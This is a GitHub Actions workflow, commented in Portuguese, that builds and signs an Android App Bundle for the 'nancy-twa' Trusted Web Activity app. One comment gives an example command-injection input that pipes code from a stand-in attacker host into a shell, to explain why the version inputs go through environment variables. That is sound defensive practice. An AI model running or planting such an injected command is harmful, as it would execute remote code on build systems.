# ══════════════════════════════════════════════════════════════════
# Build Android — TWA (Trusted Web Activity)
#
# Gera o AAB (Android App Bundle) assinado para upload na Play Store.
#
# Dispara:
#   • Manual (workflow_dispatch) — sempre que precisar gerar um novo AAB
#
# Artefato gerado: app-release.aab (válido por 30 dias)
# ══════════════════════════════════════════════════════════════════
name: Build Android — TWA

on:
  workflow_dispatch:
    inputs:
      version_name:
        description: 'Versão do app (ex: 1.0.1)'
        required: false
        default: '1.0.0'
      version_code:
        description: 'Código de versão inteiro (ex: 2)'
        required: false
        default: '1'

permissions:
  contents: read

jobs:
  build:
    name: 📱 Build AAB · Play Store
    runs-on: ubuntu-24.04

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Java 21
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '21'

      - name: Restaurar keystore do secret
        run: |
          echo "${{ secrets.ANDROID_KEYSTORE_BASE64 }}" | base64 --decode > nancy-twa/android.keystore
          echo "✅ Keystore restaurado"

      - name: Configurar versão do app
        if: github.event.inputs.version_name != ''
        env:
          # Passar por env: (não interpolar direto no run:) evita que um input
          # malicioso de workflow_dispatch (ex: `x"; curl evil.com | sh #`)
          # seja splicado no texto do script antes do shell processar — o
          # shell só vê o VALOR da variável, nunca o texto bruto do input.
          VERSION_NAME: ${{ github.event.inputs.version_name }}
          VERSION_CODE: ${{ github.event.inputs.version_code }}
        run: |
          sed -i "s/versionName \".*\"/versionName \"$VERSION_NAME\"/" nancy-twa/app/build.gradle
          sed -i "s/versionCode [0-9]*/versionCode $VERSION_CODE/" nancy-twa/app/build.gradle
          echo "✅ Versão: $VERSION_NAME ($VERSION_CODE)"

      - name: Build AAB de Release
        working-directory: nancy-twa
        run: |
          chmod +x gradlew
          # Caminho ABSOLUTO — um caminho relativo aqui é resolvido pelo AGP
          # relativo ao diretório do daemon do Gradle (~/.gradle/daemon/...),
          # não ao projeto nem à working-directory deste step. Já confirmado
          # em produção: "../nancy-twa/android.keystore" e "../android.keystore"
          # (ambos relativos) falharam por esse motivo.
          ./gradlew bundleRelease \
            -Pandroid.injected.signing.store.file="$GITHUB_WORKSPACE/nancy-twa/android.keystore" \
            -Pandroid.injected.signing.store.password=${{ secrets.ANDROID_STORE_PASSWORD }} \
            -Pandroid.injected.signing.key.alias=${{ secrets.ANDROID_KEY_ALIAS }} \
            -Pandroid.injected.signing.key.password=${{ secrets.ANDROID_KEY_PASSWORD }}

      - name: Upload AAB
        uses: actions/upload-artifact@v4
        with:
          name: nancy-release-${{ github.event.inputs.version_name || '1.0.0' }}-${{ github.sha }}
          path: nancy-twa/app/build/outputs/bundle/release/app-release.aab
          retention-days: 30

      - name: Remover keystore da memória
        if: always()
        run: rm -f nancy-twa/android.keystore
